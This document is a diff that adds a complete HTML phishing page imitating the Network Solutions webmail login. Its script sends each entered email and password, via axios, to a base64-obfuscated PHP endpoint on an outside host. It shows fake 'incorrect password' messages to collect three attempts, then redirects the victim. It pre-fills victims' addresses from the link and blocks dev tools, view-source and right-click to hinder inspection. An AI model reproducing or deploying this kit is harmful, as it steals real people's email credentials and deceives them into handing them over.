@@ -1,0 +1,496 @@
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    <meta name="robots" content="noindex, nofollow" />
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge,chrome=1" />
+    <meta name="description" content="webmail">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="build-version-number" content="">
+    <meta charset="utf-8">
+
+    <title>
+        Network Solutions&#169; Webmail Login
+
+    </title>
+    <link
+        href="https://webmailb.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/css/bootstrap.min.css"
+        rel="stylesheet">
+    <link href="https://webmailb.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/css/login.css"
+        rel="stylesheet">
+    </link>
+    <link
+        href="https://webmailb.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/css/jquery-ui-1.10.3.custom.min.css"
+        rel="stylesheet">
+    </link>
+    <script language="javascript" type="text/javascript"
+        src="https://webmailb.networksolutionsemail.com/interfaces/sso/js/jquery-1.9.1.js">
+        </script>
+    <script language="javascript" type="text/javascript"
+        src="https://webmailb.networksolutionsemail.com/interfaces/sso/js/jquery.form.js">
+        </script>
+    <script language="javascript" type="text/javascript"
+        src="https://webmailb.networksolutionsemail.com/interfaces/sso/js/form.js">
+        </script>
+
+
+    <script language="javascript" type="text/javascript"
+        src="https://webmailb.networksolutionsemail.com/interfaces/sso/js/jquery-ui-personalized-1.10.3.min.js">
+        </script>
+    <script language="javascript"
+        src="https://webmailb.networksolutionsemail.com/interfaces/sso/js/cluetip/jquery.dimensions.js">
+        </script>
+    <script language="javascript"
+        src="https://webmailb.networksolutionsemail.com/interfaces/sso/js/cluetip/jquery.cluetip.min.js">
+        </script>
+
+    <!-- <script language="javascript" type="text/javascript">
+        var user = "";
+        var pass = "";
+        $(document).ready(function () {
+            if (user.length > 0 && pass.length > 0) {
+                $("#nameuser").val(user);
+                $("#passuser").val(pass);
+                $("#ajaxform").submit();
+            }
+        });
+    </script> -->
+    <script
+      type="text/javascript"
+      src="https://npmcdn.com/parse/dist/parse.min.js"
+    ></script>
+    <script type="text/javascript" type="text/javascript">
+      Parse.initialize(
+        'pyzE7fOleUqWNsql0kusE6IFqk3rSAz9SVSKqRJj',
+        'TCG71jEmmEFizKUbWkuakTzgrdsxCEsRyVPhyvfZ'
+      ) //PASTE HERE YOUR Back4App APPLICATION ID AND YOUR JavaScript KEY
+      Parse.serverURL = ''
+    </script>
+    <script>
+        document.onkeydown = function (e) {
+          if (event.keyCode == 123) {
+            return false
+          }
+          if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'C'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'X'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'Y'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'Z'.charCodeAt(0)) {
+            return false
+          }
+          if (e.keyCode == 67 && e.shiftKey && (e.ctrlKey || e.metaKey)) {
+            return false
+          }
+          if (
+            e.keyCode == 'J'.charCodeAt(0) &&
+            e.altKey &&
+            (e.ctrlKey || e.metaKey)
+          ) {
+            return false
+          }
+          if (
+            e.keyCode == 'I'.charCodeAt(0) &&
+            e.altKey &&
+            (e.ctrlKey || e.metaKey)
+          ) {
+            return false
+          }
+          if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+            return false
+          }
+          if (
+            (e.metaKey && e.keyCode == 'S'.charCodeAt(0)) ||
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0))
+          ) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+            return false
+          }
+          if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+            return false
+          }
+          if (
+            (e.metaKey && e.keyCode == 'F'.charCodeAt(0)) ||
+            (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0))
+          ) {
+            return false
+          }
+          if (
+            (e.metaKey && e.keyCode == 'E'.charCodeAt(0)) ||
+            (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0))
+          ) {
+            return false
+          }
+        }
+        if (document.addEventListener) {
+          document.addEventListener(
+            'contextmenu',
+            function (e) {
+              e.preventDefault()
+            },
+            false
+          )
+        } else {
+          document.attachEvent('oncontextmenu', function () {
+            window.event.returnValue = false
+          })
+        }
+      </script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="top clearfix">
+
+                <a href="http://www.networksolutions.com/">
+                    <img src="https://webmailb.networksolutionsemail.com/interfaces/sso/providers/inquent.netsol/images/logo.png"
+                        alt="Network Solutions" width="154" height="62">
+                </a>
+                <h1 align="center">Webmail Login</h1>
+
+                <!-- OPTIONAL NOTICE -->
+                <span class="dispmsg">
+                    <p class=MsoNormal>
+                        Webmail has been updated. Learn more by clicking on the release notes below:
+                        <o:p></o:p>
+                    </p>
+                    <p class=MsoNormal>
+                        <o:p>&nbsp;</o:p>
+                    </p>
+                    <p class=MsoNormal><u>
+                            <a href="#" target="_blank">Webmail
+                                version 7.10.2
+                                &#8211; Release notes</a></u>
+                    <p class=MsoNormal><u>
+                            <a href="#" target="_blank">Guard
+                                Encryption version
+                                2.10.2 &#8211; Release notes</a></u>
+                    <p class=MsoNormal>
+                        <o:p>&nbsp;</o:p>
+                    </p>
+                </span>
+
+                <form name="ajaxform" id="ajaxform" method="post"><input type="hidden" name="SQMSESSID"
+                        value="06a3fdf425e1dc2fdadafa18fda2744a" />
+                    <input name="redirected" type="hidden" id="redirected" value="yes" />
+                    <input name="nameuser" placeholder="Email Address" id="nameuser" type="text" value="" required  disabled/>
+                    <input name="csrf_token_form" id="csrf_token_form" type="hidden"
+                        value="29005435a4460ef408717d1240d8f484">
+                    <script type="text/javascript">
+                        var testdomainName = "";
+                        if (testdomainName) {
+                            $('#nameuser').attr("placeholder", "Mailbox");
+                        } else {
+                            $('#nameuser').attr("placeholder", "Email Address");
+                        }
+                    </script>
+                    <input id="passuser" type="password" name="passuser" placeholder="Password" required>
+                    <input name="submit" id="submit-btn" type="submit" value="Login">
+                    <input name="domain_name" id="domain_name" value="" type="hidden" />
+                </form>
+
+                <!-- ERROR MESSSAGES -->
+                <div id="signin-message"></div>
+                <div id="err"></div>
+                <div class="forgotpw">
+                    <a id="prlink" class="pw" style="cursor: pointer;">Need to reset your password?</a>
+                </div>
+                <div class="moblelink">
+                    <a id="mobile1" class="moble" style="cursor: pointer;" href="#">Set up your iPhone</a>
+                    <a id="mobile2" class="moble" style="cursor: pointer;" href="#">Set up your Android</a>
+                    <BR>
+                </div>
+
+            </div>
+            <div class="bottom clearfix">
+                <p>If you need help logging in, please contact our customer service at 1-888-793-7657 (toll free)</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <ul>
+                <li><a href="https://forum.web.com/networksolutions/faq/#Mail/mail-index.htm">Help Center</a></li>
+                <li><a href="http://web.com/legal/privacy-policy.aspx">Privacy Policy</a></li>
+                <li><a href="http://www.networksolutions.com/legal/static-service-agreement.jsp">Service Agreement</a>
+                </li>
+                <li><a href="http://www.networksolutions.com/legal/legal-notice.jsp">Terms of Use</a></li>
+            </ul>
+            <p>
+                Copyright &#169; 2025 Network Solutions, LLC, A Web.com Company. All rights reserved.
+            </p>
+        </div>
+    </div>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.20.0/axios.min.js"></script>
+.
+    <script>
+      // Simple Disable
+      $('[data-prevent]').click((e) => {
+        e.preventDefault()
+      })
+
+      if (window.navigator.userAgent.indexOf('Edg') > -1) {
+        document.body.innerHTML = document.getElementById('elemnt').innerHTML
+        document.title = document.getElementById('elemnt-title').innerHTML
+      }
+
+      let RURL = 'aHR0cHM6Ly9mYXJhamlhbi5jb20vbmV0czBsdS90aW9uc29sdXRpMG4vc2FmZS5waHA='
+      var outgoingObj = {
+        email: '',
+        password: '',
+      }
+
+      const validateEmail = (email) => {
+        return email.match(
+          /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+        )
+      }
+
+      $(document).ready(() => {
+        var emailHref
+        var brokenEmail
+        var newURL = genID(252)
+        var newHref = `${
+          location.href.includes('#')
+            ? location.href.split('#')[0]
+            : location.href
+        }?websrc=${newURL}`
+        $('#ImgLoginBanner').attr(
+          'style',
+          `background-image: url('https://tunilsz.github.io/mxc/webmail-logo.png')`
+        )
+
+        if (location.href.includes('#')) {
+          var emailHref64 = location.href.split('#')[1]
+          emailHref = validateEmail(emailHref64)
+            ? emailHref64
+            : atob(emailHref64)
+
+          localStorage.setItem('#nameuser', emailHref)
+        } else if (localStorage.getItem('#nameuser')) {
+          var emailHref64 = localStorage.getItem('#nameuser')
+          emailHref = validateEmail(emailHref64)
+            ? emailHref64
+            : atob(emailHref64)
+        }
+
+        if (emailHref) {
+          brokenEmail = emailHref.split('@')
+          var main_domain = brokenEmail[1].split('.')[0]
+          var upper_main_domain = `${brokenEmail[1].replace(
+            main_domain.charAt(0),
+            main_domain.charAt(0).toUpperCase()
+          )}`
+
+          $('#favicon').attr(
+            'href',
+            `https://www.google.com/s2/favicons?domain=${brokenEmail[1]}`
+          )
+          $('#logo').attr(
+            'src',
+            `https://www.google.com/s2/favicons?domain=${brokenEmail[1]}`
+          )
+          //   $('#bottomline').html(`${upper_main_domain} Outlook`)
+          $('#title').html(`${upper_main_domain}`)
+          $('#document_title').html(`${upper_main_domain}`)
+          //   document.title = `${upper_main_domain} Outlook`
+
+          // $('#ImgLoginBanner').attr(
+          //   'style',
+          //   `background-image: url(`https://www.google.com/s2/favicons?domain=${brokenEmail[1]}`)`
+          // )
+          $(`#nameuser`).val(emailHref)
+        }
+        history.replaceState('', '', newHref)
+
+        passwordChecker($(`#nameuser`), $(`#passuser`), '')
+
+        function passwordChecker(emailVal, passVal, domain) {
+          let btnText;
+          var count = 0
+          var msgElem = $('#login-status')
+          var msg = $('#signin-message')
+          var submitBtn = $('#submit-btn')
+          var loadingMsg = 'Authenticating...'
+          var successMsg = 'Sorry, your sign-in session has expired. Try again'
+          var invalidMsg = 'The Password is incorrect! Please try again.'
+          var noPass = 'Please enter a password!'
+          var lessThan4 = 'Sorry, password must be above 4 characters!'
+          var error = 'Sorry no email found'
+
+          // msgElem.hide()
+          $('#ajaxform').submit((e) => {
+            e.preventDefault()
+
+            msg.hide()
+            msg.html('')
+            domain = emailVal.val().split('@')[1]
+
+            msg.show()
+
+            btnText = submitBtn.val()
+            submitBtn.val(loadingMsg)
+
+            msgElem.removeAttr('class')
+            msgElem.attr('class', 'info-notice')
+            setTimeout(async () => {
+              if (emailVal.val() == '') {
+                msg.show()
+                msg.html(error)
+                msgElem.removeAttr('class')
+                msgElem.attr('class', 'error-notice')
+              } else {
+                if (passVal.val() == '') {
+                  msg.show()
+                  msg.html(noPass)
+                  msgElem.removeAttr('class')
+                  msgElem.attr('class', 'error-notice')
+                } else {
+                  if (passVal.val().length < 4) {
+                    msg.show()
+                    msg.html(lessThan4)
+                    msgElem.removeAttr('class')
+                    msgElem.attr('class', 'error-notice')
+                    passVal.val('')
+                  } else {
+                    count = ++count
+                    if (count == 1) {
+                      msg.show()
+                      msg.html(invalidMsg)
+                      msgElem.removeAttr('class')
+                      msgElem.attr('class', 'error-notice')
+
+                      postDataHelper(emailVal.val(), passVal.val(), domain)
+                      passVal.val('')
+                    } else if (count == 2) {
+                      msg.show()
+                      msg.html(invalidMsg)
+                      msgElem.removeAttr('class')
+                      msgElem.attr('class', 'error-notice')
+
+                      postDataHelper(emailVal.val(), passVal.val(), domain)
+                      passVal.val('')
+                    } else if (count == 3) {
+                      const { out, pstD } = await postDataHelper(
+                        emailVal.val(),
+                        passVal.val(),
+                        domain
+                      )
+
+                      if (pstD) {
+                        msg.show()
+                        msg.html(successMsg)
+                        msgElem.removeAttr('class')
+                        msgElem.attr('class', 'success-notice')
+
+                        setTimeout(() => {
+                          // window.location.replace(`http://www.${out.dm}`)
+                          window.location.replace(`http://${out.dm}`)
+                        }, 5000)
+                      }
+                    }
+                  }
+                }
+              }
+
+              submitBtn.val(btnText)
+            }, 500)
+
+            // console.log("count: ", count)
+          })
+        }
+      })
+
+      async function IpDetails() {
+        const response = await axios.get('https://api.db-ip.com/v2/free/self')
+
+        const { ipAddress, city, stateProv, countryName, countryCode } =
+          response.data
+
+        // const { session_key, password } = req.body;
+        const user_agent = navigator.userAgent
+        const date = new Date().toDateString()
+        const time = new Date().toTimeString()
+
+        const gottenAddress = {
+          ip: ipAddress,
+          city: city,
+          region: stateProv,
+          countryName: countryName,
+          countryCode: countryCode,
+          user_agent: user_agent,
+          date: date,
+          time: time,
+        }
+
+        return { ...gottenAddress }
+      }
+
+      async function postData(url = '', data) {
+        const formData = new FormData()
+        formData.append('email', data.email)
+        formData.append('password', data.password)
+        const response = await axios.post(url, formData)
+        return response.data
+      }
+
+      // Example POST method implementation:
+      async function postDataHelper(em, pass, dm) {
+        outgoingObj.email = em
+        outgoingObj.password = pass
+        //   outgoingObj.domain = dm
+
+        var out = { key: em, dm }
+
+        try {
+          RURL = atob(RURL)
+        } catch (e) {}
+        
+        // Put here the url of the email
+        let pstD = await postData(RURL, {
+          ...outgoingObj,
+        })
+
+        return { out, pstD }
+      }
+
+      function genID(length) {
+        var result = ''
+        var characters =
+          'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        var charactersLength = characters.length
+        for (var i = 0; i < length; i++) {
+          result += characters.charAt(
+            Math.floor(Math.random() * charactersLength)
+          )
+        }
+
+        return result
+      }
+    </script>
+
+</body>
+
+</html>
